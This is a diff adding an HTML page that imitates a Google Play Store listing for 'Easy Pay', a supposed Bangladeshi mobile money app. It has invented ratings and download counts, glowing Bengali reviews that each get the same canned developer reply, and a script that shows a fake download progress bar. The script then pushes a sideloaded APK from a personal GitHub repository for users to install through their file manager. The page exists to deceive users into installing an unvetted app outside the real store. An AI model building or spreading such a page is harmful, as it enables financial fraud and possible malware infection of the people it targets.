@@ -1,0 +1,1016 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Easy Pay - Apps on Google Play</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Google Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
+
+    <style>
+        /* CSS Design for Google Play Store Clone */
+        :root {
+            --primary-green: #01875f;
+            --text-dark: #202124;
+            --text-grey: #5f6368;
+            --border-color: #dadce0;
+            --bg-light: #fff;
+            --bg-grey: #f1f3f4;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+
+        body { 
+            font-family: 'Roboto', sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            color: var(--text-dark); 
+            background: var(--bg-light); 
+        }
+
+        .container { 
+            max-width: 1000px; 
+            margin: 0 auto; 
+            padding: 0 24px; 
+            padding-bottom: 80px; 
+        }
+
+        /* Top Bar */
+        .top-bar { 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            padding: 8px 24px; 
+            border-bottom: 1px solid var(--border-color); 
+            position: sticky; 
+            top: 0; 
+            background: #fff; 
+            z-index: 100;
+        }
+        
+        .top-bar-nav { 
+            display: flex; 
+            gap: 24px; 
+        }
+        
+        .top-bar-nav a { 
+            text-decoration: none; 
+            color: var(--text-grey); 
+            font-weight: 500; 
+            padding: 16px 0; 
+            border-bottom: 2px solid transparent; 
+        }
+        
+        .top-bar-nav a.active { 
+            color: var(--primary-green); 
+            border-bottom-color: var(--primary-green); 
+        }
+        
+        .top-bar-icons { 
+            display: flex; 
+            gap: 16px; 
+            color: var(--text-grey); 
+            align-items: center; 
+            cursor: pointer;
+        }
+
+        /* Bottom Nav (Mobile Only) */
+        .bottom-nav { 
+            display: none; 
+            position: fixed; 
+            bottom: 0; 
+            width: 100%; 
+            background: #fff; 
+            border-top: 1px solid var(--border-color); 
+            padding: 8px 0; 
+            z-index: 100; 
+        }
+        
+        .bottom-nav-items { 
+            display: flex; 
+            justify-content: space-around; 
+        }
+        
+        .bottom-nav-item { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            text-decoration: none; 
+            color: var(--text-grey); 
+            font-size: 12px; 
+            gap: 4px;
+        }
+        
+        .bottom-nav-item.active { 
+            color: var(--primary-green); 
+        }
+
+        /* App Header */
+        .app-header { 
+            display: flex; 
+            align-items: center; 
+            gap: 24px; 
+            margin-top: 32px; 
+        }
+        
+        .app-icon-card { 
+            width: 120px; 
+            height: 120px; 
+            border-radius: 20%; 
+            overflow: hidden; 
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15); 
+        }
+        
+        .app-icon { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+        }
+        
+        .app-info { 
+            flex: 1; 
+        }
+        
+        .app-title { 
+            font-size: 36px; 
+            margin: 0 0 4px; 
+            font-weight: 500; 
+        }
+        
+        .app-developer { 
+            color: var(--primary-green); 
+            margin: 0; 
+            font-weight: 500; 
+            font-size: 16px;
+        }
+
+        /* App Meta Details */
+        .app-meta { 
+            display: flex; 
+            align-items: center; 
+            gap: 24px; 
+            margin: 24px 0; 
+            font-size: 14px; 
+            text-align: center; 
+        }
+        
+        .app-meta .item { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            font-weight: 500; 
+        }
+        
+        .app-meta .desc { 
+            color: var(--text-grey); 
+            font-size: 12px; 
+            font-weight: 400; 
+            margin-top: 4px; 
+        }
+        
+        .separator { 
+            width: 1px; 
+            height: 24px; 
+            background-color: var(--border-color); 
+        }
+        
+        .rate-icon {
+            font-size: 20px;
+            font-weight: bold;
+            color: #000;
+            border: 1px solid #000;
+            padding: 1px 4px;
+            border-radius: 4px;
+        }
+
+        /* Action Buttons */
+        .app-actions { 
+            display: flex; 
+            align-items: center; 
+            gap: 16px; 
+            margin-bottom: 24px; 
+        }
+        
+        .install-button { 
+            background-color: var(--primary-green); 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            padding: 10px 0; 
+            width: 100%; 
+            max-width: 350px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            transition: background 0.3s;
+        }
+        
+        .install-button:hover {
+            background-color: #016a4a;
+        }
+        
+        .share-button { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            color: var(--primary-green); 
+            background: none; 
+            border: none; 
+            font-weight: 500; 
+            cursor: pointer; 
+            padding: 10px; 
+        }
+        
+        .device-availability { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            color: var(--text-grey); 
+            font-size: 14px; 
+            margin-bottom: 32px; 
+        }
+
+        /* Common Section Layout */
+        .section { 
+            margin-bottom: 40px; 
+        }
+        
+        .section-title { 
+            font-size: 18px; 
+            font-weight: 500; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            margin-bottom: 16px; 
+            cursor: pointer; 
+        }
+        
+        .description { 
+            font-size: 14px; 
+            color: var(--text-grey); 
+            line-height: 20px; 
+            margin: 0; 
+        }
+
+        .description ul {
+            padding-left: 20px;
+        }
+
+        /* Data Safety */
+        .data-safety-box { 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            padding: 16px; 
+            margin-top: 16px; 
+        }
+        
+        .data-item { 
+            display: flex; 
+            align-items: flex-start; 
+            gap: 16px; 
+            margin-bottom: 16px; 
+        }
+        
+        .data-item:last-child { 
+            margin-bottom: 0; 
+        }
+        
+        .data-icon { 
+            color: var(--text-grey); 
+        }
+        
+        .data-text { 
+            font-size: 14px; 
+            color: var(--text-dark); 
+        }
+
+        /* Ratings and Reviews */
+        .ratings-buttons { 
+            display: flex; 
+            gap: 8px; 
+            margin-bottom: 24px; 
+            overflow-x: auto;
+            padding-bottom: 8px;
+        }
+        
+        .rate-button { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            background: #fff; 
+            border: 1px solid var(--border-color); 
+            border-radius: 16px; 
+            padding: 6px 16px; 
+            font-size: 14px; 
+            cursor: pointer; 
+            white-space: nowrap; 
+        }
+        
+        .rate-button.active { 
+            background: #e6f4ea; 
+            color: var(--primary-green); 
+            border-color: transparent; 
+        }
+        
+        .ratings-summary { 
+            display: flex; 
+            gap: 32px; 
+            align-items: center; 
+            margin-bottom: 32px; 
+        }
+        
+        .ratings-overview { 
+            text-align: center; 
+        }
+        
+        .overall-rating { 
+            font-size: 64px; 
+            font-weight: 400; 
+            line-height: 1; 
+        }
+        
+        .rating-stars { 
+            color: var(--primary-green); 
+            font-size: 18px; 
+            margin-top: 4px;
+        }
+        
+        .total-reviews { 
+            font-size: 12px; 
+            color: var(--text-grey); 
+            margin-top: 4px; 
+        }
+        
+        .ratings-breakdown { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 6px; 
+        }
+        
+        .rating-item { 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+        }
+        
+        .rating-label { 
+            font-size: 12px; 
+            color: var(--text-grey); 
+            font-weight: 500; 
+            width: 10px;
+        }
+        
+        .rating-bar { 
+            flex: 1; 
+            height: 10px; 
+            background: var(--bg-grey); 
+            border-radius: 5px; 
+            overflow: hidden; 
+        }
+        
+        .rating-fill { 
+            height: 100%; 
+            background: var(--primary-green); 
+            border-radius: 5px;
+        }
+
+        /* Individual Reviews */
+        .review { 
+            margin-bottom: 32px; 
+            position: relative; 
+        }
+        
+        .review-header { 
+            display: flex; 
+            align-items: center; 
+            gap: 16px; 
+            margin-bottom: 12px; 
+        }
+        
+        .review-avatar { 
+            width: 32px; 
+            height: 32px; 
+            border-radius: 50%; 
+            object-fit: cover; 
+        }
+        
+        .review-user { 
+            font-size: 14px; 
+            font-weight: 500; 
+        }
+        
+        .review-stars { 
+            font-size: 12px; 
+            color: var(--primary-green); 
+            margin-bottom: 12px; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+        }
+        
+        .review-date { 
+            color: var(--text-grey); 
+            font-weight: 400; 
+        }
+        
+        .review-text { 
+            font-size: 14px; 
+            color: var(--text-grey); 
+            line-height: 20px; 
+            margin: 0 0 16px; 
+        }
+        
+        .review-helpful { 
+            font-size: 12px; 
+            color: var(--text-grey); 
+            margin-bottom: 8px; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+        }
+        
+        .rate-confirm { 
+            border: 1px solid var(--border-color); 
+            background: #fff; 
+            border-radius: 16px; 
+            padding: 4px 16px; 
+            font-size: 12px; 
+            cursor: pointer; 
+            font-weight: 500;
+        }
+        
+        .review-response { 
+            background: var(--bg-grey); 
+            padding: 16px; 
+            border-radius: 8px; 
+            margin-top: 16px; 
+        }
+        
+        .review-response-header { 
+            display: flex; 
+            justify-content: space-between; 
+            font-size: 14px; 
+            font-weight: 500; 
+            margin-bottom: 8px; 
+        }
+        
+        .review-response-text { 
+            font-size: 14px; 
+            color: var(--text-grey); 
+            margin: 0; 
+            line-height: 20px; 
+        }
+        
+        .review-menu { 
+            position: absolute; 
+            top: 0; 
+            right: 0; 
+            color: var(--text-grey); 
+            cursor: pointer; 
+            font-size: 20px; 
+        }
+
+        /* App Supports Dropdown */
+        #additional-info-toggle { 
+            display: none; 
+        }
+        
+        .info-content { 
+            display: none; 
+            margin-top: 16px;
+        }
+        
+        #additional-info-toggle:checked ~ .info-content { 
+            display: block; 
+        }
+        
+        .expand-icon::before { 
+            content: 'expand_more'; 
+        }
+        
+        #additional-info-toggle:checked ~ label .expand-icon::before { 
+            content: 'expand_less'; 
+        }
+        
+        .info-item { 
+            display: flex; 
+            gap: 16px; 
+            margin-bottom: 16px; 
+            align-items: flex-start; 
+        }
+        
+        .info-title { 
+            font-size: 14px; 
+            font-weight: 500; 
+            display: block; 
+            margin-bottom: 4px;
+        }
+        
+        .info-subtitle { 
+            font-size: 14px; 
+            color: var(--text-grey); 
+            text-decoration: none; 
+        }
+
+        /* Footer */
+        .footer { 
+            border-top: 1px solid var(--border-color); 
+            padding: 32px 24px; 
+            background: #fff; 
+        }
+        
+        .footer-content { 
+            max-width: 1000px; 
+            margin: 0 auto; 
+            display: flex; 
+            gap: 64px; 
+        }
+        
+        .footer-column h3 { 
+            font-size: 14px; 
+            font-weight: 500; 
+            color: var(--text-dark); 
+            margin-bottom: 16px; 
+        }
+        
+        .footer-column ul { 
+            list-style: none; 
+            padding: 0; 
+            margin: 0; 
+        }
+        
+        .footer-column li { 
+            margin-bottom: 16px; 
+        }
+        
+        .footer-column a { 
+            text-decoration: none; 
+            color: var(--text-grey); 
+            font-size: 14px; 
+        }
+
+        /* Modals */
+        .modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.5); 
+            justify-content: center; 
+            align-items: center; 
+            z-index: 1000; 
+        }
+        
+        .modal-content { 
+            background: #fff; 
+            padding: 24px; 
+            border-radius: 8px; 
+            max-width: 400px; 
+            width: 90%; 
+        }
+        
+        .modal-content h3 { 
+            margin-top: 0; 
+            margin-bottom: 16px;
+        }
+        
+        .modal-buttons { 
+            display: flex; 
+            justify-content: flex-end; 
+            gap: 16px; 
+            margin-top: 24px; 
+        }
+        
+        .modal-button { 
+            border: none; 
+            background: none; 
+            font-size: 14px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            padding: 8px 16px;
+            border-radius: 4px;
+        }
+        
+        .modal-button:hover {
+            background: var(--bg-grey);
+        }
+        
+        .modal-button.confirm { 
+            color: var(--primary-green); 
+        }
+        
+        .modal-button.cancel { 
+            color: var(--text-grey); 
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .top-bar-nav { display: none; }
+            .top-bar { padding: 12px 16px; }
+            .bottom-nav { display: block; }
+            .app-title { font-size: 24px; }
+            .app-icon-card { width: 72px; height: 72px; border-radius: 12px; }
+            .app-header { gap: 16px; margin-top: 16px; }
+            .install-button { max-width: 100%; }
+            .app-meta { justify-content: space-between; gap: 8px; margin: 16px 0; }
+            .footer-content { flex-direction: column; gap: 32px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Top Bar -->
+<div class="top-bar">
+    <div style="display: flex; align-items: center; gap: 8px; color: #5f6368; cursor: pointer;">
+        <img src="https://cdn.phototourl.com/member/2026-09-14-c720038f-5b6f-4936-ba36-d8acebf25a6d.png" alt="Google Play Logo" style="height: 30px; width: auto; object-fit: contain;">
+        <span style="font-size: 22px; font-weight: 500; color: #5f6368;">Google Play</span>
+    </div>
+    <div class="top-bar-nav">
+        <a href="#">Games</a>
+        <a href="#" class="active">Apps</a>
+        <a href="#">Movies & TV</a>
+        <a href="#">Books</a>
+        <a href="#">Kids</a>
+    </div>
+    <div class="top-bar-icons">
+        <i class="material-icons-outlined">search</i>
+        <i class="material-icons-outlined">help_outline</i>
+        <i class="material-icons-outlined">account_circle</i>
+    </div>
+</div>
+
+<!-- Bottom Navigation Bar (Mobile Only) -->
+<div class="bottom-nav">
+    <div class="bottom-nav-items">
+        <a href="#" class="bottom-nav-item">
+            <i class="material-icons-outlined">games</i>
+            <span>Games</span>
+        </a>
+        <a href="#" class="bottom-nav-item active">
+            <i class="material-icons-outlined">apps</i>
+            <span>Apps</span>
+        </a>
+        <a href="#" class="bottom-nav-item">
+            <i class="material-icons-outlined">child_care</i>
+            <span>Kids</span>
+        </a>
+    </div>
+</div>
+
+<div class="container">
+    <!-- App Header -->
+    <div class="app-header">
+        <div class="app-icon-card">
+            <img src="https://cdn.phototourl.com/member/2026-09-14-7a62b56d-0fc4-41dc-9f21-48f41d973754.jpg" alt="Easy Pay" class="app-icon">
+        </div>
+        <div class="app-info">
+            <h1 class="app-title">Easy Pay</h1>
+            <p class="app-developer">Money Transfer Company</p>
+        </div>
+    </div>
+    
+    <!-- Meta Details -->
+    <div class="app-meta">
+        <div class="item">
+            <span class="star">4.8 <i class="material-icons-outlined" style="font-size: 14px;">star</i></span>
+            <span class="desc">1368 reviews</span>
+        </div>
+        <div class="separator"></div>
+        <div class="item">
+            <span>500k+</span>
+            <span class="desc">Downloads</span>
+        </div>
+        <div class="separator"></div>
+        <div class="item">
+            <span class="rate-icon">3+</span>
+            <span class="desc">Rated for 3+</span>
+        </div>
+    </div>
+    
+    <!-- App Actions -->
+    <div class="app-actions">
+        <button class="install-button" id="installButton">Install</button>
+        <button class="share-button">
+            <i class="material-icons-outlined">share</i>
+            <span>Share</span>
+        </button>
+    </div>
+    
+    <div class="device-availability">
+        <i class="material-icons-outlined">devices</i>
+        <span>This app is available for all of your devices</span>
+    </div>
+
+    <!-- What's New -->
+    <div class="section">
+        <h2 class="section-title">What’s new <i class="material-icons-outlined">arrow_forward</i></h2>
+        <p class="description">
+            We’re always working to improve your experience and make the app more rewarding. In this update, we’ve improved performance, fixed bugs, and made the interface easier to use.
+        </p>
+    </div>
+
+    <!-- About this app -->
+    <div class="section">
+        <h2 class="section-title">About this app <i class="material-icons-outlined">arrow_forward</i></h2>
+        <div class="description">
+            <p><strong>Easy Pay is the Digital Financial Service of Bangladesh.</strong><br><br>
+            The <strong>Easy Pay</strong> app is a fast, secure, and reliable digital financial service app that makes your everyday transactions simple such as Cash In, Cash Out, Send Money (P2P), Mobile Recharge, and more. You ll receive notifications of your latest activities, and you can easily view your transaction history and summaries.<br><br>
+            <strong>Easy Pay</strong> will soon bring exciting and innovative services to meet customer needs and expectations.<br><br>
+            <strong>Key Features:</strong><br><br>
+            <strong>Secure Transactions:</strong> The Easy Pay app is highly secure and requires your PIN at two different stages for extra safety.<br><br>
+            <strong>Personalization:</strong> Add your display name and change your profile picture anytime.<br><br>
+            <strong>Error-Free Money Transfer:</strong> Select recipients directly from your contact list to avoid sending money to the wrong number.</p>
+            <ul>
+                <li>Cash In and Cash Out</li>
+                <li>Send Money (P2P)</li>
+                <li>Mobile Recharge</li>
+                <li>Bill Payments</li>
+                <li>Transaction History</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Data Safety -->
+    <div class="section">
+        <h2 class="section-title">Data safety <i class="material-icons-outlined">arrow_forward</i></h2>
+        <p class="description">
+            Your data security starts with how the developer collects and shares your information. Privacy and
+            safety measures may vary depending on how you use the app, your location, and your age. The
+            developer provides this information and may update it over time.
+        </p>
+        <div class="data-safety-box">
+            <div class="data-item">
+                <i class="material-icons-outlined data-icon">share</i>
+                <span class="data-text">No data shared with third parties</span>
+            </div>
+            <div class="data-item">
+                <i class="material-icons-outlined data-icon">cloud_upload</i>
+                <span class="data-text">This app may collect these data types</span>
+            </div>
+            <div class="data-item">
+                <i class="material-icons-outlined data-icon">security</i>
+                <span class="data-text">Data is encrypted in transit</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ratings and Reviews -->
+    <div class="section">
+        <h2 class="section-title">Ratings and reviews <i class="material-icons-outlined">arrow_forward</i></h2>
+        
+        <div class="ratings-buttons">
+            <button class="rate-button active"><i class="material-icons-outlined">smartphone</i> Mobile</button>
+            <button class="rate-button"><i class="material-icons-outlined">laptop_chromebook</i> Desktop</button>
+            <button class="rate-button"><i class="material-icons-outlined">tablet_mac</i> Tablet</button>
+        </div>
+        
+        <div class="ratings-summary">
+            <div class="ratings-overview">
+                <div class="overall-rating">4.8</div>
+                <div class="rating-stars">★★★★★</div>
+                <div class="total-reviews">1368 reviews</div>
+            </div>
+            <div class="ratings-breakdown">
+                <div class="rating-item"><span class="rating-label">5</span><div class="rating-bar"><div class="rating-fill" style="width: 75%;"></div></div></div>
+                <div class="rating-item"><span class="rating-label">4</span><div class="rating-bar"><div class="rating-fill" style="width: 15%;"></div></div></div>
+                <div class="rating-item"><span class="rating-label">3</span><div class="rating-bar"><div class="rating-fill" style="width: 8%;"></div></div></div>
+                <div class="rating-item"><span class="rating-label">2</span><div class="rating-bar"><div class="rating-fill" style="width: 5%;"></div></div></div>
+                <div class="rating-item"><span class="rating-label">1</span><div class="rating-bar"><div class="rating-fill" style="width: 7%;"></div></div></div>
+            </div>
+        </div>
+
+        <!-- Review 1 -->
+        <div class="review">
+            <div class="review-header">
+                <img src="https://cdn.phototourl.com/member/2026-09-10-83c59ffd-d0cc-42d3-8c70-e4c3bdf3de2d.jpg" alt="User" class="review-avatar">
+                <span class="review-user">মোঃ আরেফিন হোসেন</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars">★★★★★ <span class="review-date">14 September 2026</span></div>
+            <p class="review-text">ভালো কমিশন রেট, আরেফিন ভাইয়ের সব সময় সাপোর্ট, ফাস্ট সার্ভিস, সব মিলিয়ে ১০০% রিকমেন্ট করব। আপনারা সবাই EsayPay অ্যাপস এর মাধ্যমে লেনদেন করুন নিভয়ে।</p>
+            <div class="review-helpful">58 people found this review helpful</div>
+            <div class="review-helpful">Did you find this helpful?
+                <button class="rate-confirm">Yes</button>
+                <button class="rate-confirm">No</button>
+            </div>
+            <div class="review-response">
+                <div class="review-response-header"><span>Easy Pay</span><span>14 September 2026</span></div>
+                <p class="review-response-text">ধন্যবাদ স্যার, আপনার মূল্যবান বক্তব্য শেয়ার করার জন্য, এতে নতুন গ্রাহকরা উৎসাহিত হবে! -" EsayPay" সবসময় চেষ্টা করে আপনাদের পাশে থাকার জন্য ।</p>
+            </div>
+        </div>
+
+        <!-- Review 2 -->
+        <div class="review">
+            <div class="review-header">
+                <img src="https://cdn.phototourl.com/member/2026-09-10-8d6d34dd-cc23-459d-a159-28025387c451.jpg" alt="User" class="review-avatar">
+                <span class="review-user">সাজিদ হাসান</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars">★★★★★ <span class="review-date">10 September 2026</span></div>
+            <p class="review-text">প্রথমে আমিও অনেক ভয় পাইছি, এখন আলহামদুলিল্লাহ বিশ্বাস আছে, ডেইলি ২/৩হাজার টাকা লেনদেন করি EsayPay অ্যাপ এর মাধ্যমে।</p>
+            <div class="review-helpful">43 people found this review helpful</div>
+            <div class="review-helpful">Did you find this helpful?
+                <button class="rate-confirm">Yes</button>
+                <button class="rate-confirm">No</button>
+            </div>
+            <div class="review-response">
+                <div class="review-response-header"><span>Easy Pay</span><span>10 September 2026</span></div>
+                <p class="review-response-text">ধন্যবাদ স্যার, আপনার মূল্যবান বক্তব্য শেয়ার করার জন্য, এতে নতুন গ্রাহকরা উৎসাহিত হবে! -" EsayPay" সবসময় চেষ্টা করে আপনাদের পাশে থাকার জন্য ।</p>
+            </div>
+        </div>
+        
+        <!-- Review 3 -->
+        <div class="review">
+            <div class="review-header">
+                <img src="https://cdn.phototourl.com/free/2026-09-10-86a12c8f-d6dd-4aed-8701-de9cb84c2077.jpg" alt="User" class="review-avatar">
+                <span class="review-user">তানভীর আহমেদ</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars">★★★★★ <span class="review-date">5 September 2026</span></div>
+            <p class="review-text">আমি নিজে প্রতি দিন EsayPay আপস এর মাধ্যমে ৫০ থেকে ৬০ এর মতো ড্রাইভ অফার সেল করি। তাদের Service ২৪ ঘন্টা চালু থাকে এবং খুব ফাস্ট Service ও কমিশন রেটও অনেক ভালো।</p>
+            <div class="review-helpful">39 people found this review helpful</div>
+            <div class="review-helpful">Did you find this helpful?
+                <button class="rate-confirm">Yes</button>
+                <button class="rate-confirm">No</button>
+            </div>
+            <div class="review-response">
+                <div class="review-response-header"><span>Easy Pay</span><span>5 September 2026</span></div>
+                <p class="review-response-text">ধন্যবাদ স্যার, আপনার মূল্যবান বক্তব্য শেয়ার করার জন্য, এতে নতুন গ্রাহকরা উৎসাহিত হবে! -" EsayPay" সবসময় চেষ্টা করে আপনাদের পাশে থাকার জন্য ।</p>
+            </div>
+        </div>
+
+        <!-- Review 4 -->
+        <div class="review">
+            <div class="review-header">
+                <img src="https://cdn.phototourl.com/free/2026-09-10-811b4544-e474-42ff-abdd-cce5390c9179.jpg" alt="User" class="review-avatar">
+                <span class="review-user">ফাহিম চৌধুরী</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars">★★★★★ <span class="review-date">28 August 2026</span></div>
+            <p class="review-text">আমি এই EsayPay আপস এর সাথে ৯ মাসের বেশি সময় যাবত যুক্ত আছি, এই পযন্ত প্রায় ৯০-১ লক্ষ টাকার মতো মোটামুটি লেনদেন করেছি, আলহামদুলিল্লাহ কোনো দিন কোনো সমস্যা হয়নি।</p>
+            <div class="review-helpful">61 people found this review helpful</div>
+            <div class="review-helpful">Did you find this helpful?
+                <button class="rate-confirm">Yes</button>
+                <button class="rate-confirm">No</button>
+            </div>
+            <div class="review-response">
+                <div class="review-response-header"><span>Easy Pay</span><span>28 August 2026</span></div>
+                <p class="review-response-text">ধন্যবাদ স্যার, আপনার মূল্যবান বক্তব্য শেয়ার করার জন্য, এতে নতুন গ্রাহকরা উৎসাহিত হবে! -" EsayPay" সবসময় চেষ্টা করে আপনাদের পাশে থাকার জন্য ।</p>
+            </div>
+        </div>
+
+        <!-- Review 5 -->
+        <div class="review">
+            <div class="review-header">
+                <img src="https://cdn.phototourl.com/free/2026-09-10-006dacc1-3187-430b-9a11-0197627bd896.jpg" alt="User" class="review-avatar">
+                <span class="review-user">মাহমুদুল হাসান</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars">★★★★★ <span class="review-date">15 August 2026</span></div>
+            <p class="review-text">আরফান ভাই ট্রাস্টেড একজন মানুষ, আমি তার মাধ্যমে প্রতি নিয়ত টাকা EsayPay আপস এর মাধ্যমে ডিপোজিট করে বিকাশে ও বাংকে টাকা পাঠাই, দোয়া রইলো আরফান ভাই এর জন্য।</p>
+            <div class="review-helpful">72 people found this review helpful</div>
+            <div class="review-helpful">Did you find this helpful?
+                <button class="rate-confirm">Yes</button>
+                <button class="rate-confirm">No</button>
+            </div>
+            <div class="review-response">
+                <div class="review-response-header"><span>Easy Pay</span><span>15 August 2026</span></div>
+                <p class="review-response-text">ধন্যবাদ স্যার, আপনার মূল্যবান বক্তব্য শেয়ার করার জন্য, এতে নতুন গ্রাহকরা উৎসাহিত হবে! -" EsayPay" সবসময় চেষ্টা করে আপনাদের পাশে থাকার জন্য ।</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- App Supports -->
+    <div class="section">
+        <input type="checkbox" id="additional-info-toggle">
+        <label for="additional-info-toggle" class="section-title" style="margin-bottom: 0;">
+            App Support
+            <i class="material-icons-outlined expand-icon"></i>
+        </label>
+        <div class="info-content">
+            <div class="info-item">
+                <i class="material-icons-outlined data-icon">language</i>
+                <div class="info-text">
+                    <span class="info-title">Website</span>
+                    <a href="https://easypayapp.store/" class="info-subtitle">https://easypayapp.store/</a>
+                </div>
+            </div>
+            <div class="info-item">
+                <i class="material-icons-outlined data-icon">email</i>
+                <div class="info-text">
+                    <span class="info-title">Support Email</span>
+                    <a href="mailto:easypaysupport@gmail.com" class="info-subtitle">easypaysupport@gmail.com</a>
+                </div>
+            </div>
+            <div class="info-item">
+                <i class="material-icons-outlined data-icon">policy</i>
+                <div class="info-text">
+                    <span class="info-title">Privacy Policy</span>
+                    <a href="#" class="info-subtitle">View Privacy Policy</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-column">
+            <h3>Google Play</h3>
+            <ul>
+                <li><a href="#">Play Pass</a></li>
+                <li><a href="#">Play Points</a></li>
+                <li><a href="#">Gift cards</a></li>
+            </ul>
+        </div>
+        <div class="footer-column">
+            <h3>Kids & family</h3>
+            <ul>
+                <li><a href="#">Parent Guide</a></li>
+                <li><a href="#">Family sharing</a></li>
+            </ul>
+        </div>
+    </div>
+</footer>
+
+<!-- Modals -->
+<div class="modal" id="installModal">
+    <div class="modal-content">
+        <h3>Install Easy Pay Official App</h3>
+        <p style="font-size: 14px; color: #5f6368; line-height: 20px;">Do you want to download and install the Easy Pay Official app? This will download a file, and you may need to Install from your device File Manager.</p>
+        <div class="modal-buttons">
+            <button class="modal-button cancel" id="cancelButton">Cancel</button>
+            <button class="modal-button confirm" id="confirmButton">Install</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const installButton = document.getElementById('installButton');
+    const installModal = document.getElementById('installModal');
+    const confirmButton = document.getElementById('confirmButton');
+    const cancelButton = document.getElementById('cancelButton');
+
+        function downloadApk() {
+        // আপনার দেওয়া ডাইরেক্ট ডাউনলোড লিংক
+        const apkPath = 'https://github.com/mominul947/Easy-pay-play-store/raw/refs/heads/main/Easy%20Pay.apk'; 
+        
+        const link = document.createElement('a');
+        link.href = apkPath;
+        link.download = 'EasyPay.apk';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+
+
+    installButton.addEventListener('click', () => {
+        installModal.style.display = 'flex';
+    });
+
+    confirmButton.addEventListener('click', () => {
+        installModal.style.display = 'none';
+        installButton.disabled = true;
+
+        const progressSteps = [5, 15, 35, 60, 85, 100];
+        let currentStep = 0;
+
+        const updateProgress = () => {
+            if (currentStep < progressSteps.length) {
+                installButton.textContent = `${progressSteps[currentStep]}% Download ....`;
+                currentStep++;
+                setTimeout(updateProgress, 1000); 
+            } else {
+                installButton.textContent = 'Installing...';
+                downloadApk();
+                setTimeout(() => {
+                    installButton.textContent = 'Open';
+                    installButton.disabled = false;
+                }, 3000);
+            }
+        };
+        updateProgress();
+    });
+
+    cancelButton.addEventListener('click', () => {
+        installModal.style.display = 'none';
+    });
+
+    installModal.addEventListener('click', (e) => {
+        if (e.target === installModal) {
+            installModal.style.display = 'none';
+        }
+    });
+</script>
+
+</body>
+</html>
